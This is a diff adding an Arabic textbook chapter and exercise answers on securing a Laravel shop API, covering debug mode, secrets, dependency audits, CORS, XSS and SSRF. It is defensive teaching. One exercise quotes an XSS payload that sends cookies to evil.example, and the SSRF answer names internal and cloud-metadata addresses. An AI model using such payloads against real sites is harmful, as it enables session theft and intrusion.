+  &quot;message&quot;: &quot;SQLSTATE[42P01]: Undefined table: 7 ERROR:  relation \&quot;missing_table\&quot; does not exist\nLINE 1: SELECT * FROM missing_table\n                      ^ (Connection: pgsql, Host: 127.0.0.1, Port: 5432, Database: shop, SQL: SELECT * FROM missing_table)&quot;,
+  &quot;exception&quot;: &quot;Illuminate\\Database\\QueryException&quot;,
+  &quot;file&quot;: &quot;vendor/laravel/framework/src/Illuminate/Database/Connection.php&quot;,
+  &quot;line&quot;: 864
+}</pre></div>
+
+<p>يسمّي الخطأ قاعدة البيانات، ومضيفها ومنفذها، وSQL الفاشل، وأين يعيش الكود؛ والجواب الكامل فيه أيضاً تتبع مكدس عبر الإطار. وعلى جهاز التطوير هذا بالضبط ما تريد؛ وفي الإنتاج خريطة للمهاجمين. <strong><code>APP_DEBUG=false</code> في الإنتاج، دائماً</strong>، والتفاصيل تذهب إلى السجل (الفصل 14)، حيث لا يقرؤها غيرك. و<code>php artisan about</code> تعرض الإعداد الحالي.</p>
+
+<h2><span class="sec">10.7</span> <span>الأسرار والإعدادات</span></h2>
+
+<p>ملف <code>.env</code> الذي سرّبه اجتياز المسار يحفظ أثمن ما في التطبيق. وقواعده:</p>
+
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># ما لا يراه git أبداً</span>
+<span class="c">$ </span><span class="k">cat .gitignore | grep -n env</span>
+3:.env
+4:.env.backup
+5:.env.production
+<span class="c line-bidi"># الثغرات المعروفة في الاعتماديات</span>
+<span class="c">$ </span><span class="k">composer audit --no-ansi 2&gt;&amp;1</span>
+No security vulnerability advisories found.</pre></div>
+
+<ul>
+<li><strong>لا في المستودع أبداً.</strong> ملف <code>.gitignore</code> في Laravel يستثني <code>.env</code> أصلاً (الجزء الأول من المخرجات أعلاه)؛ و<code>.env.example</code>، بكل الأسماء وبلا أي قيمة حقيقية، يوثّق ما يلزم. والسر الذي دُفع مرة يبقى في التاريخ إلى الأبد: غيّره، ولا تكتفِ بحذف الملف.</li>
+<li><strong>مختلف في كل بيئة</strong>، تضبطه المنصة (حاويات الفصل 17 تأخذها متغيرات بيئة) أو مدير أسرار. و<code>APP_KEY</code> يوقّع الكوكيز والقيم المشفرة ويشفّرها: والمفتاح المسرّب يتيح للمهاجم تزويرها، فتغييره عاجل، و<code>APP_PREVIOUS_KEYS</code> تُبقي البيانات المشفرة القديمة مقروءة أثناء ذلك.</li>
+<li><strong>يُقرأ عبر <code>config()</code>.</strong> نادِ <code>env()</code> داخل <code>config/*.php</code> وحدها؛ فبعد <code>php artisan config:cache</code> في الإنتاج، تعيد <code>env()</code> في غيرها <code>null</code>. والإعداد الناقص يجب أن يفشل بصوت عالٍ عند البدء، لا عند أول طلب يحتاجه.</li>
+<li><strong>لا يُسجَّل أبداً.</strong> يخفي Laravel حقول <code>password</code> من أخطاء التحقق والاستثناءات؛ فأبقِ الرموز والمفاتيح خارج رسائل سجلك أنت أيضاً.</li>
+</ul>
+
+<h2><span class="sec">10.8</span> <span>الاعتماديات</span></h2>
+
+<p>كود المتجر بضع مئات من الأسطر؛ والحزم في <code>vendor</code> مئات الآلاف. وثغرة معروفة في نسخة قديمة، أو حزمة خبيثة على بُعد خطأ إملائي من حزمة مشهورة، أو حزمة نزيهة سُرق حساب صاحبها، كلها قد تصل إلى خادمك. و<code>composer audit</code> (الجزء الثاني من المخرجات أعلاه) تفحص كل نسخة مثبتة مقابل قاعدة بيانات للثغرات المعروفة؛ شغّلها في CI، وأفشل البناء عند وجود نتائج. وأودع <code>composer.lock</code> وانشر بـ <code>composer install</code>، فيأخذ كل جهاز النسخ التي اختبرتها بالضبط؛ ودع روبوتاً (Dependabot أو Renovate) يفتح طلبات تحديث صغيرة كثيراً؛ وقبل إضافة حزمة، انظر من يصونها وهل تكفي أسطر قليلة من كودك.</p>
+
+<aside class="box rule"><p class="box-title"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="9" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8.5 14 7 22l5-2.5L17 22l-1.5-8" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/></svg>عادة محترف: قائمة أمان في كل مراجعة</p><p>احفظ قائمة قصيرة بجانب قالب طلب الدمج: هل كل مدخل يُتحقق منه بحجم؟ هل يصل أي مدخل إلى دالة <code>Raw</code>، أو مسار، أو عنوان، أو صدفة، أو <code>{!! !!}</code>؟ هل كل مسار جديد خلف المصادقة وسياسة، مع اختبار لـ «لا»؟ هل توجد أسرار جديدة، وهل هي في <code>.env</code> و<code>config/</code>؟ هل الحزم الجديدة لازمة ومصونة؟ ثلاثون ثانية لكل مراجعة تمنع أغلب هذا الفصل.</p></aside>
+
+<h2 class="plain-h">أخطاء شائعة</h2>
+
+<table>
+<thead><tr><th>الخطأ</th><th>ما يحدث</th><th>الإصلاح</th></tr></thead>
+<tbody>
+<tr><td>متغيرات مُدرجة في SQL</td><td>يقرأ المهاجمون أي جدول أو يغيّرونه</td><td>الربط؛ و<code>Rule::in</code> لأسماء الأعمدة</td></tr>
+<tr><td><code>forceFill($request-&gt;all())</code> أو <code>$guarded = []</code></td><td>يجعل الزبائن أنفسهم مديرين</td><td>قوائم الحقول القابلة للملء والبيانات المُتحقق منها وحدها</td></tr>
+<tr><td>مدخلات المستخدم في مسارات الملفات</td><td>أسرار وكود يُقرأ من القرص</td><td>الأقراص، والأسماء العشوائية، والبحث بالرقم</td></tr>
+<tr><td>جلب عناوين اختارها العميل</td><td>الخادم يهاجم شبكتك أنت</td><td>قوائم مسموحة للمضيفين، ولا عناوين داخلية</td></tr>
+<tr><td><code>{!! !!}</code> مع محتوى المستخدمين</td><td>سكربتات تعمل في متصفحات مستخدمين آخرين</td><td><code>{{ }}</code>، وسياسة أمان المحتوى</td></tr>
+<tr><td><code>APP_DEBUG=true</code> في الإنتاج</td><td>SQL والمضيفون ومسارات الكود في كل خطأ</td><td><code>false</code>، والتفاصيل في السجل</td></tr>
+<tr><td>بلا <code>max</code> على النصوص والصفحات</td><td>طلب واحد يشغل الخادم</td><td>حجم لكل مدخل</td></tr>
+<tr><td>أسرار في المستودع أو السجلات</td><td>كل من معه الكود معه المفاتيح</td><td><code>.env</code>، ومتغيرات البيئة، والتدوير</td></tr>
+<tr><td>عدم تحديث الحزم أبداً</td><td>ثغرات معروفة تبقى مفتوحة سنوات</td><td><code>composer audit</code> في CI، وتحديثات صغيرة منتظمة</td></tr>
+</tbody>
+</table>
+
+<h2 class="plain-h">الملخص</h2>
+
+<ul class="summary">
+<li><strong>لا تثق بأي مدخل</strong>، ودافع بالعمق؛ و<strong>OWASP Top 10</strong> خريطة أكثر ما يسوء.</li>
+<li>يحدث <strong>الحقن</strong> حين يصير المدخل كوداً: SQL تأخذ <strong>الربط</strong>، وأسماء الأعمدة تأخذ قائمة مسموحة.</li>
+<li><strong>قوائم الحقول القابلة للملء</strong> و<strong>البيانات المُتحقق منها</strong> توقف الإسناد الجماعي؛ والأقراص توقف الاجتياز؛ والقوائم المسموحة توقف SSRF وإعادات التوجيه المفتوحة.</li>
+<li>تُحمى المتصفحات بـ <strong>ترويسات الأمان</strong>، و<strong>CORS</strong> لأصول مسمّاة، ورموز CSRF، وكوكيز <code>SameSite</code>.</li>
+<li>لكل مدخل <strong>حجم</strong>، و<strong><code>APP_DEBUG</code> مطفأ</strong> في الإنتاج.</li>
+<li><strong>الأسرار</strong> تعيش في البيئة، وتُقرأ عبر <code>config()</code>؛ والاعتماديات تُدقَّق وتُحدَّث كثيراً.</li>
+</ul>
+
+<p class="answers-note"><strong>إجابات «اختبر نفسك»:</strong> 1. مع الربط، يُرسل نص SQL والقيمة منفصلين، فلا تحلل قاعدة البيانات القيمة بصفة SQL أبداً، أياً كانت أحرفها. أما التهريب اليدوي فيحاول جعل القيمة بريئة داخل النص، ويجب أن يتوقع كل حرف خاص وكل ترميز وكل خصوصية لقاعدة البيانات؛ ونسيان واحد يكفي. 2. كانت <code>validate()</code> ستعيد <code>name</code> وحده، وكانت قائمة الحقول القابلة للملء ستتجاهل <code>role</code> على أي حال، فلا يصير عمر مديراً؛ لكن الطلب سينجح دون أن يُخبَر أن الحقل غير مسموح. أما <code>prohibited</code> فترفضه بـ 422. 3. CORS لا يُقصد به إيقاف الطلبات؛ بل يمنع المتصفح من السماح لسكربت على موقع آخر بقراءة الرد. والخادم ما زال يفحص من يتصل وما يجوز له؛ والطلب هنا لم يغيّر شيئاً.</p>
+
+<!-- projects -->
+<h2 class="plain-h">مشاريع تطبيقية</h2>
+
+<p class="projects-intro">كل مشروع يقوّي API المتجر. ولكل دفاع، اكتب اختباراً يبيّن فشل الهجوم.</p>
+
+<div class="project">
+<p class="project-label">المشروع 10.1 · سهل</p>
+<h3>قوِّ API المتجر</h3>
+<p class="project-goal">طبّق دفاعات هذا الفصل على API الفصل 4.</p>
+<p class="project-skills"><strong>ستتدرب على:</strong> الوسطاء، وإعداد CORS، وإعدادات البيئة، واختباراتها.</p>
+<ol class="steps">
+<li>أضف وسيط ترويسات الأمان، وCORS لأصل واحد يُقرأ من <code>.env</code> عبر <code>config/cors.php</code>.</li>
+<li>تحقق أن <code>APP_DEBUG</code> مطفأة في ملاحظات الإنتاج في <code>.env.example</code>، وأن لكل قاعدة نص <code>max</code>.</li>
+<li>اكتب اختبارات ميزات تفحص الترويسات، وجواب CORS للأصل المسموح، وأن مساراً معطوباً لا يجيب إلا «Server Error».</li>
+</ol>
+<p class="hint"><strong>تلميح:</strong> <code>$this-&gt;withHeaders(['Origin' =&gt; …])-&gt;get(…)-&gt;assertHeader(…)</code> تختبر CORS بلا متصفح.</p>
+</div>
+
+<div class="project">
+<p class="project-label medium">المشروع 10.2 · متوسط</p>
+<h3>هاجم كودك أنت</h3>
+<p class="project-goal">راجع كود الفصول السابقة كمهاجم، وأصلح ما تجد.</p>
+<p class="project-skills"><strong>ستتدرب على:</strong> مراجعة الكود للأمان، وكتابة الاستغلالات اختبارات، وإصلاحها.</p>
+<ol class="steps">
+<li>اسرد كل مدخلات API (حقول الجسم، ومعاملات الاستعلام، ومعاملات المسار، والترويسات) وأين ينتهي كل منها.</li>
+<li>ابحث في الكود عن <code>Raw(</code> و<code>DB::select</code> و<code>forceFill</code> و<code>$guarded</code> و<code>{!!</code> و<code>env(</code> خارج <code>config/</code>.</li>
+<li>لكل مشكلة حقيقية، اكتب أولاً اختباراً يبيّن نجاح الهجوم، ثم أصلحها وراقب تغيّر الاختبار.</li>
+<li>اكتب تقريراً قصيراً: ما جرّبت، وما وجدت، وما غيّرت.</li>
+</ol>
+<p class="hint"><strong>تلميح:</strong> دقّق في معاملات الترتيب والترشيح؛ فهي المكان المعتاد الذي تأتي منه أسماء الأعمدة من العميل.</p>
+</div>
+
+<div class="project">
+<p class="project-label hard">المشروع 10.3 · تحدٍّ</p>
+<h3>صور منتجات آمنة</h3>
+<p class="project-goal">دع المديرين يرفعون صور المنتجات دون فتح ثغرة واحدة.</p>
+<p class="project-skills"><strong>ستتدرب على:</strong> التحقق من الملفات، وفحص المحتوى، والأسماء العشوائية، وتقديم الملفات بأمان.</p>
+<ol class="steps">
+<li>اقبل رفعاً بالقواعد <code>file</code> و<code>image</code> و<code>mimes:png,jpg</code> و<code>max:2048</code>، للمديرين وحدهم.</li>
+<li>احفظه بـ <code>$request-&gt;file('image')-&gt;store('products', 'local')</code> (اسم عشوائي، خارج <code>public/</code>)، واحفظ المسار والاسم الأصلي في قاعدة البيانات.</li>
+<li>قدّمه عبر مسار يبحث عنه برقم المنتج ويعيد <code>Storage::download()</code> أو <code>response()-&gt;file()</code> بالنوع الذي فحصته و<code>nosniff</code>.</li>
+<li>اختبر ملف HTML أُعيدت تسميته إلى <code>.png</code>، وملفاً من 3 MB، وزبوناً يحاول الرفع.</li>
+</ol>
+<p class="hint"><strong>تلميح:</strong> قاعدة <code>mimes</code> تنظر إلى محتوى الملف، لا اسمه وحده؛ ومع ذلك، لا تثق أبداً بالاسم ولا بالنوع الذي أرسله العميل حين تقدّمه مرة أخرى.</p>
+</div>
+<!-- /projects -->
+
+<h2 class="plain-h">تمارين</h2>
+
+<ol class="exercises">
+<li><span class="level">سهل</span> مسار قائمة يأخذ <code>?sort=price</code> وينفذ <code>Product::orderByRaw($request-&gt;sort)-&gt;get()</code>. لماذا لا يصلحه الربط، وما الذي يصلحه؟</li>
+<li><span class="level">سهل</span> يقول زميل: «لا نحتاج مصادقة على هذا المسار، فـ CORS لا يسمح إلا لموقعنا». ما الخطأ في ذلك؟</li>
+<li><span class="level medium">متوسط</span> قبل <code>PATCH</code> بجسم JSON من موقع المتجر، يرسل المتصفح طلباً <dfn>تمهيدياً</dfn> (preflight). أرسل الطلب نفسه بـ <code>curl</code>، واشرح كل ترويسة في الجواب.</li>
+<li><span class="level medium">متوسط</span> صفحة الإدارة في المتجر تعرض أسماء المنتجات بـ <code>{!! $product-&gt;name !!}</code>، وأنشأ أحدهم منتجاً اسمه <code>&lt;img src=x onerror="fetch('//evil.example/?c='+document.cookie)"&gt;</code>. ماذا يحدث حين يفتح مدير الصفحة، وأي دفاعات هذا الفصل يوقفه كل منها؟</li>
+<li><span class="level hard">تحدٍّ</span> مسار جديد يستورد صورة منتج من عنوان يكتبه المدير، بـ <code>Http::get($url)</code>. اسرد ثلاث طرق قد يسيء بها مهاجم استخدامه، والفحوص التي توقف كلاً منها.</li>
+</ol>
+
+<p class="answers-note">إجابات التمارين في آخر الكتاب، وفي مستودع كود الكتاب.</p>
+
+<div class="next">
+<p class="next-title">في الفصل 11</p>
+<p>بعض العمل لا ينبغي أن يحدث والزبون ينتظر: البريد، والتقارير، وتصغير الصور. الطوابير والمهام: إنجاز العمل لاحقاً، وإعادته بأمان، وعدم فقدانه أبداً.</p>
+</div>
+</section>
 <section style="page: answers" class="chapter answers" data-chapter="99" data-code="b3/answers/ar">
 <div class="opener"><span class="opener-num"></span><p class="chapter-kicker">ملحق</p><h1>حلول التمارين</h1><div class="opener-bit"><svg viewBox="0 0 120 140" aria-hidden="true">
 <path d="M32,104 Q20,112 20,122" fill="none" stroke="#1a1a1a" stroke-width="6" stroke-linecap="round"/>
@@ -5358,6 +5743,24 @@ Content-Type: application/json
     }</pre></div>
 جاء الطلب برمز الهاتف، ورمز الحاسوب، الذي لم يُستخدم فيه، يجيب الآن 401.</li>
 <li>يعيد الدخول رمزين: رمز وصول، JWT صالح عشر دقائق يحمل رقم المستخدم ودوره، ورمز تجديد، بايتات عشوائية تُحفظ تجزئتها في قاعدة البيانات بانتهاء طويل. وكل طلب API يفحص توقيع JWT وانتهاءه فقط، بلا استعلام لقاعدة البيانات. وحين ينتهي رمز الوصول يرسل العميل رمز التجديد إلى <code>POST /api/auth/refresh</code>، الذي يفحصه في قاعدة البيانات، ويستبدله بجديد (فلا يعمل رمز تجديد مسروق إلا مرة)، ويعيد JWT جديداً. والخروج يحذف رمز التجديد؛ ويبقى رمز الوصول صالحاً حتى عشر دقائق، وهذا هو الثمن. والمكسب: لا بحث في قاعدة البيانات في أغلب الطلبات، وهذا مهم حين تفحص خدمات كثيرة الرموز؛ أما لـ API واحد تشارك قاعدة البيانات أصلاً في كل طلب فيه، فرموز Sanctum أبسط.</li>
+</ol>
+
+
+<h2 class="plain-h">الفصل 10</h2>
+<ol class="exercises">
+<li>لا يقوم الربط إلا مقام <em>قيمة</em>؛ فـ <code>ORDER BY ?</code> ترتّب بنص ثابت، واحد لكل الصفوف، وأسماء الأعمدة جزء من SQL نفسه. تحقق من المدخل مقابل قائمة ثابتة، <code>'sort' =&gt; ['nullable', Rule::in(['name', 'price'])]</code>، ومرّر القيمة المُتحقق منها وحدها إلى <code>orderBy()</code> (لا <code>orderByRaw</code>)، التي تقتبسها معرّفاً أيضاً. وما عدا ذلك يُرفض بـ 422.</li>
+<li>تفرض المتصفحاتُ CORS، ولقراءة الردود فقط. فأي أحد يستطيع استدعاء المسار بـ <code>curl</code> أو سكربت أو خادم آخر، ولا يبالي أي منها بـ CORS؛ وحتى متصفح على موقع آخر ما زال يستطيع <em>إرسال</em> طلبات كثيرة. وحماية البيانات والأفعال تأتي من المصادقة والتفويض على الخادم. وCORS يقرر فقط سكربتات أي المواقع يجوز لها قراءة الأجوبة في متصفح المستخدم.</li>
+<li>يرسل المتصفح أولاً <code>OPTIONS</code> بالأصل، والطريقة التي يريدها، والترويسات التي يريد إرسالها؛ ولا يرسل <code>PATCH</code> الحقيقية إلا إن سمح الجواب بالثلاثة:
+<div class="listing" dir="ltr"><div class="listing-title">الطرفية</div><pre class="code"><span class="c line-bidi"># ما يسأله المتصفح قبل PATCH من موقع المتجر</span>
+<span class="c">$ </span><span class="k">curl -s -i -X OPTIONS localhost:8000/api/users/2 -H &#x27;Origin: https://shop.example&#x27; -H &#x27;Access-Control-Request-Method: PATCH&#x27; -H &#x27;Access-Control-Request-Headers: content-type&#x27; | grep -iE &#x27;^(HTTP|access-control)&#x27;</span>
+HTTP/1.0 204 No Content
+Access-Control-Allow-Origin: https://shop.example
+Access-Control-Allow-Methods: GET, PATCH
+Access-Control-Allow-Headers: content-type
+Access-Control-Max-Age: 0</pre></div>
+<code>204</code>: بلا جسم، إذن فقط. و<code>Access-Control-Allow-Origin</code> تسمّي موقع المتجر، فيجوز لهذا الأصل قراءة الأجوبة. و<code>Access-Control-Allow-Methods</code> تسرد <code>GET</code> و<code>PATCH</code>، من <code>config/cors.php</code>. و<code>Access-Control-Allow-Headers</code> تسمح بـ <code>content-type</code>، التي يحتاجها جسم JSON. و<code>Access-Control-Max-Age: 0</code> تخبر المتصفح ألا يتذكر الجواب؛ ورفع <code>max_age</code> في الإعداد يتيح له تخطي الطلب التمهيدي مدةً.</li>
+<li><code>{!! !!}</code> تُدخل الاسم بصفة HTML، فينشئ المتصفح صورة بمصدر غير صالح، ويعمل معالج <code>onerror</code> فيها بجلسة المدير، وتذهب أي كوكي تقرؤها السكربتات إلى المهاجم؛ وقد يتصرف السكربت أيضاً باسم المدير مباشرة. وكل دفاع يوقف جزءاً منه: <code>{{ $product-&gt;name }}</code> تُظهر الاسم نصاً (الإصلاح الحقيقي)؛ وسياسة أمان المحتوى بلا <code>'unsafe-inline'</code> ترفض المعالجات المضمّنة، و<code>connect-src</code> ترفض الطلب إلى موقع آخر؛ وكوكي الجلسة في Laravel <code>HttpOnly</code>، فلا تقرؤها السكربتات؛ والتحقق قد يرفض <code>&lt;</code> و<code>&gt;</code> في أسماء المنتجات. طبقات، لأن أياً منها قد يغيب يوماً.</li>
+<li>(1) عنوان داخلي (<code>http://localhost:6379</code>، أو <code>http://10.0.0.5/admin</code>، أو عنوان بيانات السحابة <code>http://169.254.169.254/</code>) يجعل الخادم يصل إلى خدمات غير عامة، وقد يعيد أجوبتها أو أسرارها: اسمح بـ <code>https</code> وحده، وحلّل اسم المضيف بنفسك وارفض العناوين الخاصة وعناوين الحلقة المحلية وعناوين الربط المحلي، وأطفئ إعادات التوجيه (<code>Http::withoutRedirecting()</code>) أو افحص كل قفزة بالطريقة نفسها. (2) ملف ضخم أو لا ينتهي يشغل الخادم ويملأ القرص: <code>Http::timeout()</code>، وحجم أقصى، وفحص أن المحتوى صورة حقاً. (3) عنوان لخادم بطيء يُبقي العمّال مشغولين: مهل قصيرة، والتنزيل في مهمة في الطابور (الفصل 11) لا داخل الطلب. والأفضل أن يرفع المديرون الملف بدل إعطاء عنوان.</li>
 </ol>
 
 </section>
